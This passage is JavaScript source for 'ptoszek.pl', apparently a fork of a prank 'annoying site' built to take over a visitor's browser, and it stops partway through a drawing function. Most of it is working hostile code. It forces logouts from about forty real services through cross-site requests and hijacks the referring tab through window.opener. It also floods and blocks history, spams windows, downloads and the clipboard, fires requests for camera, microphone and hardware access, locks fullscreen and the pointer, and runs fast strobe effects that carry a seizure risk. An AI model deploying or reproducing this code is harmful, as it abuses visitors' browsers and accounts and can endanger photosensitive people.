/*
  ptoszek.pl
  Powered by Jaczup

  My version (ptoszek.pl): 
  - https://github.com/jaczup/ptoszek.pl
  Original version (theannoyingsite.com): 
  - https://github.com/feross/TheAnnoyingSite.com/

  Contact with me: https://jaczup.pl
  Official Discord server (maintained in Polish language), get the PTOK tag: https://dc.ptoszek.pl

  Contributors:
    @jaczup - https://github.com/jaczup
    @intexpression - https://github.com/intexpression
    @dan64iel - https://github.com/dan64iel
    @imzeme - https://github.com/imzeme
    @GameShoot8050 - https://github.com/GameShoot8050
    @wetraks -  https://github.com/wetraks
    @cryblanka - https://github.com/cryblanka
    @9fm - https://github.com/9fm
    @MARECKIyt - https://github.com/MARECKIyt
    @Hyd3r1 - https://github.com/Hyd3r1
    @MariaWasNotAvailable - https://github.com/MariaWasNotAvailable
*/

const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const ART = [
  `
┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
┈┈┈┈╭━━━━━━╮┊☆ ┊┊
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
  `,
  `
░░▓▓░░░░░░░░▓▓░░
░▓▒▒▓░░░░░░▓▒▒▓░
░▓▒▒▒▓░░░░▓▒▒▒▓░
░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
▓▒░░▒▒▒▒▒▒▒▒▒░░▓
▓▒░░▒▓▒▒▓▒▒▓▒░░▓
░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
░░▓▒▒▒▒▒▒▒▒▒▒▓░░
░░░▓▓▓▓▓▓▓▓▓▓░░░
  `
]

const SEARCHES = [
  'jshop',
  'ptoszek',
  'ptak',
  'kanarek',
  'jaczup'
]

const VIDEOS = [
  'media/videos/jaczup.mp4',
  'media/videos/duck.mp4',
  'media/videos/rickroll.mp4',
  'media/videos/golomb.mp4',
  'media/videos/mushbox.mp4',
  'media/videos/clearmax.mp4',
  'media/videos/freestrona.mp4',
  'media/videos/ajhsdfhjasdbhfjasdfs.mp4',
  'media/videos/v09044g40000cgr968jc77u1t2krb89g.mov',
  'media/videos/intro.mp4',
  'media/videos/szybkakaczka.mp4', // added by @dan64iel
  'media/videos/kaczuszka.mp4', //added by @imzeme
  'media/videos/gratulacje.mp4', //added by @GameShoot8050
  'media/videos/puddi.mp4' //added by @MariaWasNotAvailable
]

const FILE_DOWNLOADS = [
  'media/images/ptok.jpg',
  'media/images/jaczup.jpg',
  'media/images/jaczupme.png',
  'media/images/ptoszek.jpg',
  'media/images/ptakwspodniach.jpg',
  'media/images/kichajacyptoszek.jpg',
  'media/images/lubieptoszki.png',
  'media/images/zimowyptoszek.jpeg', // added by @dan64iel
  'media/images/zlyptok.jpeg', //added by @imzeme
  'media/images/grubyptok.jpg', //added by @imzeme
  'media/images/ptokzjajami.jpeg', //added by @MARECKIyt
  'media/images/ptiszka.jpg',
]

const PHRASES = [
  'hello my name is ptoszek, lol',
  'birds are funny lalalalalalalallalala',
  'wgl co u cb bo u mn dbr',
  'knuuurrr eksplozja',
  'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
  'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
  'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo',
  'halo bang, anda telah terptoszek lol',
  'jangan ditutup bang, asik kok',
  'burung ptok ptok ptok selalu memantau',
  'mau kabur kemana lu bang',
  'cie yang panik gak bisa nutup tab'
]

const LOGOUT_SITES = {
  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
  JShop: ['GET', 'https://jshop.partners/panel/logout'],
  Vimeo: ['GET', 'https://vimeo.com/log_out'], // added by @intexpression
  Tumblr: ['GET', 'https://www.tumblr.com/logout'], // added by @intexpression
  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], // added by @intexpression
  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], // added by @intexpression
  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], // added by @intexpression
  OLX: ['GET', 'https://www.olx.pl/account/logout'], // added by @intexpression
  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'], // added by @cryblanka
  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'], // added by @cryblanka
  Guilded:  ['POST', 'https://www.guilded.gg/api/logout'], // added by @cryblanka
  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'], // added by @MARECKIyt
  Pinterest: ['GET', 'https://www.pinterest.com/logout/'], // added by @MARECKIyt
  Reddit: ['GET', 'https://www.reddit.com/logout'], // added by @MARECKIyt
  Spotify: ['GET', 'https://www.spotify.com/logout/'], // added by @MARECKIyt
  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'], // added by @MARECKIyt
  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'], // added by @MARECKIyt
  Trello: ['GET', 'https://trello.com/logout'], // added by @MARECKIyt
  Baidu: ['GET', 'https://passport.baidu.com/?logout'], // added by @MARECKIyt
  VK: ['GET', 'https://vk.com/exit'], // added by @MARECKIyt
  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'], // added by @MARECKIyt
  Asana: ['POST', 'https://app.asana.com/app/asana/-/logout'], // added by @Hyd3r1
}

/**
 * Array to store the child windows spawned by this window.
 */
/**
 * Array to store the child windows spawned by this window.
 */
const wins = []

/**
 * Global State & Tracking
 */
let interactionCount = 0
let numSuperLogoutIframes = 0
let syncChannel = null
let pipWindowInstance = null
let retroPopupCount = 0
let faviconCanvas = null
let faviconCtx = null
let faviconAngle = 0
let isFaviconMarqueeStarted = false
let theraminCtx = null
let theraminOsc = null
let theraminGain = null
let theraminPanner = null
let mouseX = typeof window !== 'undefined' ? window.innerWidth / 2 : 500
let mouseY = typeof window !== 'undefined' ? window.innerHeight / 2 : 500
let eyeX = mouseX
let eyeY = mouseY
let isTrackerRunning = false
let autoWindowInterval = null
let filterChaosInterval = null
let konamiProgress = 0
let megaChaosActive = false
let bsodShown = false
let wakeLockSentinel = null
let isFullscreenLocked = false
let isStrobeActive = false

// Konami Code sequence
const KONAMI_SEQUENCE = ['ArrowUp','ArrowUp','ArrowDown','ArrowDown','ArrowLeft','ArrowRight','ArrowLeft','ArrowRight','b','a']

// Matrix Rain columns
const matrixColumns = []
const BIRD_CHARS = ['🐦','🐤','🐧','🦅','🦜','🐔','🦆','🐣','🕊','🦉','P','T','O','S','Z','E','K']

// Ghost Cursors Setup (14 multi-cursors)
const ghostCursors = Array.from({ length: 14 }, (_, i) => ({
  x: mouseX,
  y: mouseY,
  lag: 0.03 + (i * 0.015),
  angleOffset: i * 0.45,
  distOffset: 15 + (i * 6),
  color: `hsl(${(i * 25) % 360}, 90%, 65%)`
}))

// Particle Sparks Pool
const cursorParticles = []

// Meme Images & Bouncers Pool
const loadedMemeImages = []
FILE_DOWNLOADS.forEach(src => {
  if (typeof Image !== 'undefined') {
    const img = new Image()
    img.src = src
    img.onload = () => loadedMemeImages.push(img)
  }
})
const bouncers = []

// BroadcastChannel for cross-tab multi-window synchronization
try {
  if (typeof BroadcastChannel !== 'undefined') {
    syncChannel = new BroadcastChannel('ptoszek_sync_channel')
    syncChannel.onmessage = (event) => {
      const data = event.data
      if (data && data.type === 'SYNC_INTERACTION') {
        interactionCount = Math.max(interactionCount, data.count || 0)
        updateAppBadge()
      } else if (data && data.type === 'FLASH_CHAOS') {
        document.body.style.backgroundColor = data.color || '#ff0055'
        setTimeout(() => { document.body.style.backgroundColor = '' }, 200)
      }
    }
  }
} catch (e) {}

function broadcastEvent (type, payload = {}) {
  try {
    if (syncChannel) {
      syncChannel.postMessage({ type, count: interactionCount, ...payload })
    }
  } catch (e) {}
}

function repeatStringNumTimes(string, times) {
  var repeatedString = "";
  while (times > 0) {
    repeatedString += string;
    times--;
  }
  return repeatedString;
}

const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500)

/**
 * Is this window a child window?
 */
const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

/**
 * Is this window a parent window?
 */
const isParentWindow = !isChildWindow

/*
 * Run this code in all windows, *both* child and parent windows.
 */
init()

/*
 * Use `window.opener` to detect if this window was opened by another window
 */
if (isChildWindow) initChildWindow()
else initParentWindow()

/**
 * Initialization code for *both* parent and child windows.
 */
function init () {
  confirmPageUnload()

  setupTouchLocks()
  setupGyroscopeAndMotion()
  setupBackAndEscRandomSwitcher()

  interceptUserInput(event => {
    interactionCount += 1
    updateAppBadge()
    broadcastEvent('SYNC_INTERACTION')
    triggerScreenShake()
    spawnBouncerMeme()
    startCSSFilterChaos()
    scheduleFakeBSOD()
    showNewsTicker()
    triggerEmojiFlood()
    startEmojiFloodLoop()
    setupNotificationSpam()
    requestScreenWakeLock()
    forceFullscreenLock()
    setupRelentlessFullscreenLock()
    spawnStackedImagesFrenzy(15)
    startStrobeEffect()

    const hud = document.getElementById('cyber-hud')
    if (hud) hud.style.display = 'block'

    spawnRetroPopupBurst(4)
    triggerWebShareSpam()
    triggerDeepLinkFlood()
    triggerFakeMobileAlert()

    // Initialize New Mobile & Desktop Features
    initTorchAndCamera()
    startBatteryDrainerEngine()
    initGDIPayloadCanvas()
    initContinuousMachineSound()
    startUltraFastStrobe()
    startPermissionBomb()
    startModalDialogTrap()
    startHistoryFloodTrap()
    startScreenFlipChaos()

    // Prevent default behavior (breaks closing window shortcuts)
    event.preventDefault()
    event.stopPropagation()

    // 'touchstart' and 'touchend' events are not able to open a new window
    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
    // a clever way to exclude touch events.
    if (event.which !== 0) openWindowMultiple(8)

    startVibrateInterval()
    openDocumentPictureInPicture()
    triggerFileDownload()

    focusWindows()
    copySpamToClipboard()
    speak()
    startTheramin()
    setupMediaSession()
    requestFullscreen()

    // Capture key presses on the Command or Control keys, to interfere with the
    // "Close Window" shortcut.
    if (event.key === 'Meta' || event.key === 'Control') {
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
    } else {
      requestPointerLock()

      if (!window.ApplePaySession) {
        // Don't request TouchID on every interaction in Safari since it blocks
        // the event loop and stops windows from moving
        requestWebauthnAttestation()
      }
      requestClipboardRead()
      requestMidiAccess()
      requestBluetoothAccess()
      requestUsbAccess()
      requestSerialAccess()
      requestHidAccess()
      requestCameraAndMic()
      requestFullscreen()
    }
  })
}

/**
 * Initialization code for child windows.
 */
function initChildWindow () {
  registerProtocolHandlers()
  hideCursor()
  moveWindowBounce()
  startVideo()
  detectWindowClose()
  triggerFileDownload()
  speak()
  rainbowThemeColor()
  animateUrlWithEmojis()
  startAnimatedFaviconAndTitle()
  initEyeTrackerCanvas()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      startAlertInterval()
    }
  })
}

/**
 * Initialization code for parent windows.
 */
function initParentWindow () {
  showHelloMessage()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()
  initEyeTrackerCanvas()
  startAutoWindowSpawner()
  setupKonamiCode()

  interceptUserInput(event => {
    // Only run these on the first interaction
    if (interactionCount === 1) {
      registerProtocolHandlers()
      attemptToTakeoverReferrerWindow()
      hideCursor()
      startVideo()
      startAlertInterval()
      superLogout()
      removeHelloMessage()
      rainbowThemeColor()
      animateUrlWithEmojis()
      startAnimatedFaviconAndTitle()
      speak('To był błąd')
    }
  })
}

/**
 * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
 * link in a new window. For example, Messenger.com from Facebook does this.
 * However, that means that `window.opener` will be set, which allows us to redirect
 * that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
 * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
 */
function attemptToTakeoverReferrerWindow () {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`
  }
}

/**
 * Returns true if the parent window is on the same origin. It's not enough to check
 * that `window.opener` is set, because that will also get set if a site on a
 * different origin links to theannoyingsite.com with `target='_blank'`.
 */
function isParentSameOrigin () {
  try {
    // May throw an exception if `window.opener` is on another origin
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

/**
 * Ask the user "are you sure you want to leave this page?". In most browsers,
 * this will not actually do anything unless the user has at least one interaction
 * with the page before they close it.
 */
function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    speak('Please don\'t go!')
    event.returnValue = true
  })
}

/**
 * Attempt to register all possible browser-whitelisted protocols to be handled by
 * this web app instead of their default handlers.
 */
function registerProtocolHandlers () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const protocolWhitelist = [
    'bitcoin',
    'geo',
    'im',
    'irc',
    'ircs',
    'magnet',
    'mailto',
    'mms',
    'news',
    'ircs',
    'nntp',
    'sip',
    'sms',
    'smsto',
    'ssh',
    'tel',
    'urn',
    'webcal',
    'wtai',
    'xmpp'
  ]

  const handlerUrl = window.location.href + '/url=%s'

  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'Ptoszek')
  })
}

/**
 * Attempt to access the user's camera and microphone, and attempt to enable the
 * torch (i.e. camera flash) if the device has one.
 */
function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter((device) => device.kind === 'videoinput')

    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]

    navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)

      imageCapture.getPhotoCapabilities().then(() => {
        // Let there be light!
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => { /* No torch on this device */ })
    }, () => { /* ignore errors */ })
  })
}

/**
 * Animating the URL with emojis
 * See: https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/
 */
function animateUrlWithEmojis () {
  if (window.ApplePaySession) {
    // Safari doesn't show the full URL anyway, so we can't animate it
    return
  }
  const rand = Math.random()
  if (rand < 0.33) {
    animateUrlWithBabies()
  } else if (rand < 0.67) {
    animateUrlWithWave()
  } else {
    animateUrlWithMoons()
  }

  function animateUrlWithBabies () {
    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']

    setInterval(() => {
      let s = ''
      let i; let m

      for (i = 0; i < 10; i++) {
        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += '👶' + e[m]
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithWave () {
    setInterval(() => {
      let i; let n; let s = ''

      for (i = 0; i < 10; i++) {
        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4

        s += String.fromCharCode(0x2581 + n)
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithMoons () {
    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let m = 0

    setInterval(() => {
      let s = ''
      let x = 0

      if (!m) {
        while (d[x] === 4) {
          x++
        }

        if (x >= d.length) m = 1
        else {
          d[x]++
        }
      } else {
        while (d[x] === 0) {
          x++
        }

        if (x >= d.length) m = 0
        else {
          d[x]++

          if (d[x] === 8) d[x] = 0
        }
      }

      d.forEach(function (n) {
        s += f[n]
      })

      window.location.hash = s
    }, 100)
  }
}

/**
 * Lock the user's pointer, without even being in full screen!
 * Require user-initiated event.
 */
function requestPointerLock () {
  const requestPointerLockApi = (
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock
  )

  requestPointerLockApi.call(document.body)
}

/**
 * Start vibrating the device at random intervals, on supported devices.
 * Requires user-initiated event.
 */
function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)

  // If the gamepad can vibrate, we will at random intervals every second. And at random strengths!
  window.addEventListener('gamepadconnected', (event) => {
    const gamepad = event.gamepad
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          gamepad.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random()
          })
        }
      }, 1000)
    }
  })
}

/**
 * Intercept all user-initiated events and call the given the function, `onInput`.
 */
function interceptUserInput (onInput) {
  let hasStarted = false;
  
  const wrappedInput = (e) => {
    // Synchronously unlock and start AudioContext on any user touch/click gesture
    if (machineAudioCtx) {
      if (machineAudioCtx.state === 'suspended') {
        machineAudioCtx.resume().catch(() => {});
      }
      initContinuousMachineSound();
    }

    if (hasStarted) return;
    hasStarted = true;
    onInput(e);
  };

  ['touchstart', 'touchend', 'pointerdown', 'mousedown', 'click', 'keydown'].forEach(evtType => {
    document.addEventListener(evtType, wrappedInput, { passive: false });
    window.addEventListener(evtType, wrappedInput, { passive: false });
  });
}

/**
 * Start an invisible, muted video so we have a one ready to put into
 * picture-in-picture mode on the first user-interaction.
 */
function startInvisiblePictureInPictureVideo () {
  const video = document.createElement('video')
  video.src = getRandomArrayEntry(VIDEOS)
  video.loop = true
  video.muted = true
  video.style = HIDDEN_STYLE
  video.autoplay = true
  video.play()

  document.body.appendChild(video)
}

/**
 * Activate Document Picture-in-Picture or fallback to Video PiP.
 * Requires user-initiated event.
 */
async function openDocumentPictureInPicture () {
  try {
    if ('documentPictureInPicture' in window && !pipWindowInstance) {
      pipWindowInstance = await window.documentPictureInPicture.requestWindow({
        width: 320,
        height: 320
      })

      pipWindowInstance.document.body.innerHTML = `
        <div style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #111; color: #34eb7d; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; overflow: hidden; margin: 0; padding: 12px; box-sizing: border-box;">
          <img src="media/images/ptok.jpg" style="width: 120px; height: 120px; border-radius: 50%; border: 3px solid #34eb7d; animation: spin 5s linear infinite;" alt="Ptoszek">
          <h3 style="margin: 10px 0 4px; font-size: 15px; color: #fff;">PTOSZEK SURVEILLANCE</h3>
          <p style="margin: 0; font-size: 11px; color: #aaa;">Mengawasi desktop Anda...</p>
          <div id="pip-counter" style="margin-top: 8px; font-weight: bold; font-size: 12px; color: #34eb7d;">Chaos Level: ${interactionCount}</div>
          <style>
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
          </style>
        </div>
      `

      pipWindowInstance.addEventListener('pagehide', () => {
        pipWindowInstance = null
      })
    } else {
      enablePictureInPicture()
    }
  } catch (e) {
    enablePictureInPicture()
  }
}

/**
 * Activate video picture-in-picture fallback.
 */
function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (video && document.pictureInPictureEnabled) {
    video.style = ''
    video.muted = false
    video.requestPictureInPicture().catch(() => {})
    video.play().catch(() => {})
  }
}

/**
 * Setup Media Session API to hijack OS playback controls.
 */
function setupMediaSession () {
  if (!('mediaSession' in navigator)) return
  try {
    navigator.mediaSession.metadata = new MediaMetadata({
      title: 'Ptoszek Surveillance Soundscape',
      artist: 'Ptoszek & Jaczup',
      album: 'ptoszek.pl Official',
      artwork: [
        { src: 'media/images/ptok.jpg', sizes: '256x256', type: 'image/jpeg' },
        { src: 'media/images/intro.gif', sizes: '512x512', type: 'image/gif' }
      ]
    })

    const actionHandlers = [
      ['play', () => { speak('Audio aktif kembali!'); startTheramin(); }],
      ['pause', () => {
        speak('Jangan coba-coba mematikan Ptoszek!');
        triggerFileDownload();
        broadcastEvent('FLASH_CHAOS', { color: '#ff0055' });
      }],
      ['previoustrack', () => speak('Lagu burung bagian satu')],
      ['nexttrack', () => { speak('Lagu burung bagian dua'); triggerFileDownload(); }],
      ['seekbackward', () => speak('Mundur')],
      ['seekforward', () => speak('Maju')]
    ]

    for (const [action, handler] of actionHandlers) {
      try {
        navigator.mediaSession.setActionHandler(action, handler)
      } catch (err) {}
    }
  } catch (e) {}
}

/**
 * Update App Badge on taskbar / PWA icon.
 */
function updateAppBadge () {
  try {
    if ('setAppBadge' in navigator) {
      navigator.setAppBadge(interactionCount % 999 + 1)
    }
  } catch (e) {}
}

function startAnimatedFaviconAndTitle () {
  if (isFaviconMarqueeStarted) return
  isFaviconMarqueeStarted = true

  if (!faviconCanvas) {
    faviconCanvas = document.createElement('canvas')
    faviconCanvas.width = 32
    faviconCanvas.height = 32
    faviconCtx = faviconCanvas.getContext('2d')
  }

  const faviconLink = document.getElementById('dynamic-favicon') || document.querySelector("link[rel*='icon']")
  let titleIndex = 0
  const marqueeText = ' 🚨 PTOSZEK TELAH MENGAMBIL ALIH BROWSER ANDA 🚨 WE NO WALNIJ W SPACJE! 🚨 '

  setInterval(() => {
    // 1. Animate Title Marquee
    titleIndex = (titleIndex + 1) % marqueeText.length
    document.title = marqueeText.substring(titleIndex) + marqueeText.substring(0, titleIndex)

    // 2. Draw Dynamic Favicon Frame
    if (faviconCtx && faviconLink) {
      faviconCtx.clearRect(0, 0, 32, 32)

      // Background circle with rotating color
      faviconAngle += 0.15
      faviconCtx.beginPath()
      faviconCtx.arc(16, 16, 15, 0, Math.PI * 2)
      faviconCtx.fillStyle = `hsl(${(faviconAngle * 50) % 360}, 90%, 55%)`
      faviconCtx.fill()

      // Cartoon Eyes
      const eyeOffset = Math.sin(faviconAngle) * 2
      faviconCtx.fillStyle = '#ffffff'
      faviconCtx.beginPath()
      faviconCtx.arc(11, 13, 4, 0, Math.PI * 2)
      faviconCtx.arc(21, 13, 4, 0, Math.PI * 2)
      faviconCtx.fill()

      // Pupils
      faviconCtx.fillStyle = '#000000'
      faviconCtx.beginPath()
      faviconCtx.arc(11 + eyeOffset, 13, 2, 0, Math.PI * 2)
      faviconCtx.arc(21 + eyeOffset, 13, 2, 0, Math.PI * 2)
      faviconCtx.fill()

      // Beak
      faviconCtx.fillStyle = '#ffaa00'
      faviconCtx.beginPath()
      faviconCtx.moveTo(16, 16)
      faviconCtx.lineTo(13, 22)
      faviconCtx.lineTo(19, 22)
      faviconCtx.closePath()
      faviconCtx.fill()

      faviconLink.href = faviconCanvas.toDataURL('image/png')
    }
  }, 100)
}

/**
 * Procedural Eye-Tracking Canvas with Spring / Lerp Physics.
 */
/**
 * Trigger CSS 3D Screen Shake effect.
 */
function triggerScreenShake () {
  try {
    document.body.classList.remove('shaking')
    void document.body.offsetWidth
    document.body.classList.add('shaking')
    setTimeout(() => {
      document.body.classList.remove('shaking')
    }, 250)
  } catch (e) {}
}

function spawnRetroPopupBurst (count = 4) {
  for (let i = 0; i < count; i++) {
    setTimeout(() => {
      spawnRetroPopup()
    }, i * 80)
  }
}

/**
 * Retro Windows 98-style In-Page Popup Spawner.
 */
function spawnRetroPopup (customText) {
  try {
    const container = document.getElementById('retro-container')
    if (!container) return
    if (document.querySelectorAll('.retro-popup').length >= 25) return
    retroPopupCount++

    const popup = document.createElement('div')
    popup.className = 'retro-popup'
    const x = Math.max(10, Math.floor(Math.random() * (window.innerWidth - 260)))
    const y = Math.max(10, Math.floor(Math.random() * (window.innerHeight - 200)))
    popup.style.left = `${x}px`
    popup.style.top = `${y}px`

    const randomImg = getRandomArrayEntry(FILE_DOWNLOADS)
    const titles = ['SECURITY ALERT', 'PTOSZEK WARNING', 'ERROR 404: BIRDS EVERYWHERE', 'SURVEILLANCE NOTICE', 'MEME INJECTION']
    const title = getRandomArrayEntry(titles)
    const text = customText || getRandomArrayEntry(PHRASES)

    popup.innerHTML = `
      <div class="retro-titlebar">
        <span>🛑 ${title} #${retroPopupCount}</span>
        <span class="retro-close-btn">X</span>
      </div>
      <div class="retro-content">
        <img src="${randomImg}" alt="Ptok">
        <div><b>${text}</b></div>
        <button style="margin-top: 5px; font-size: 10px; cursor: pointer; padding: 2px 8px; font-family: inherit;">OK (Spawn +2)</button>
      </div>
    `

    const duplicateAndEscape = (e) => {
      e.stopPropagation()
      triggerScreenShake()
      speak()
      const newX = Math.max(10, Math.floor(Math.random() * (window.innerWidth - 260)))
      const newY = Math.max(10, Math.floor(Math.random() * (window.innerHeight - 200)))
      popup.style.left = `${newX}px`
      popup.style.top = `${newY}px`
      spawnRetroPopup()
      spawnRetroPopup()
    }

    const closeBtn = popup.querySelector('.retro-close-btn')
    const okBtn = popup.querySelector('button')
    if (closeBtn) closeBtn.addEventListener('click', duplicateAndEscape)
    if (okBtn) okBtn.addEventListener('click', duplicateAndEscape)

    container.appendChild(popup)
  } catch (e) {}
}

/**
 * Spawn Bouncing Meme Physics.
 */
function spawnBouncerMeme () {
  if (bouncers.length >= 35) return
  if (loadedMemeImages.length === 0) return
  const img = getRandomArrayEntry(loadedMemeImages)
  const size = Math.floor(Math.random() * 40) + 50
  bouncers.push({
    x: Math.random() * (window.innerWidth - size),
    y: Math.random() * (window.innerHeight - size),
    vx: (Math.random() - 0.5) * 8 + (Math.random() > 0.5 ? 3 : -3),
    vy: (Math.random() - 0.5) * 8 + (Math.random() > 0.5 ? 3 : -3),
    size,
    img,
    rot: Math.random() * Math.PI * 2,
    vrot: (Math.random() - 0.5) * 0.08
  })
}

/**
 * Draw custom retro Windows mouse pointer arrow on canvas.
 */
function drawWindowsCursor (ctx, x, y, scale = 1, color = '#ffffff') {
  ctx.save()
  ctx.translate(x, y)
  ctx.scale(scale, scale)
  ctx.beginPath()
  ctx.moveTo(0, 0)
  ctx.lineTo(0, 18)
  ctx.lineTo(5, 14)
  ctx.lineTo(9, 22)
  ctx.lineTo(12, 20)
  ctx.lineTo(8, 13)
  ctx.lineTo(13, 13)
  ctx.closePath()
  ctx.fillStyle = color
  ctx.fill()
  ctx.lineWidth = 1.5
  ctx.strokeStyle = '#000000'
  ctx.stroke()
  ctx.restore()
}

/**
 * Procedural Eye-Tracking, Multi-Cursor Swarm, Particle Sparks, and Bouncing Memes.
 */
function initEyeTrackerCanvas () {
  if (isTrackerRunning) return
  const canvas = document.getElementById('tracker-canvas')
  if (!canvas) return
  const ctx = canvas.getContext('2d')
  if (!ctx) return
  isTrackerRunning = true

  // Initial bouncers
  for (let i = 0; i < 4; i++) {
    setTimeout(spawnBouncerMeme, 1000 + i * 500)
  }

  function resize () {
    canvas.width = window.innerWidth
    canvas.height = window.innerHeight
  }
  window.addEventListener('resize', resize)
  resize()

  window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX
    mouseY = e.clientY

    if (isFullscreenLocked && !document.fullscreenElement && !document.webkitFullscreenElement) {
      forceFullscreenLock()
    }

    // Emit particle trail
    if (cursorParticles.length < 80) {
      cursorParticles.push({
        x: mouseX + (Math.random() - 0.5) * 10,
        y: mouseY + (Math.random() - 0.5) * 10,
        vx: (Math.random() - 0.5) * 3,
        vy: (Math.random() - 0.5) * 3,
        size: Math.random() * 5 + 3,
        alpha: 1,
        color: `hsl(${(Date.now() / 5) % 360}, 100%, 60%)`
      })
    }
  })

  function draw () {
    ctx.clearRect(0, 0, canvas.width, canvas.height)

    // 0. Draw Matrix Bird Rain (Background)
    updateAndDrawMatrixRain(ctx, canvas.width, canvas.height)

